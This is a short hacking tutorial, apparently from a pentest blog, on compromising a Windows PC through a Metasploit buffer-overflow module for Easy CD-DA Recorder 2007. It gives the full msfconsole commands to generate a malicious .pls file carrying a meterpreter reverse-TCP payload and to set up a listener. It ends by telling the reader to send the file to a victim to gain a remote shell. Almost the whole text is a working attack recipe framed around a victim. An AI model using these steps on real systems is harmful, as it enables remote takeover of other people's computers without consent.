Hack Remote Windows PC using Easy CD-DA Recorder PLS Buffer Overflow

This module exploits stack-based buffer overflow vulnerability in Easy CD-DA Recorder 2007, caused by a long string in a playlist entry. By persuading the victim to open a specially-crafted .PLS file, a remote attacker could execute arbitrary code on the system or cause the application to crash. This Metasploit module has been tested successfully on Windows XP SP3 and Windows 7 SP1
Easy CD-DA Recorder 2007
Attacker: kali Linux
Victim PC: Windows 7
Open Kali terminal type msfconsole

Now type use exploit/windows/fileformat/easycdda_pls_bof
msf exploit (easycdda_pls_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (easycdda_pls_bof)>set lhost 192.168.1.6 (IP of Local Host)
msf exploit (easycdda_pls_bof)>exploit

After we successfully generate the malicious pls File, it will stored on your local computer
/root/.msf4/local/msf.pls

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.6
exploit
Now send your msf.pls files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
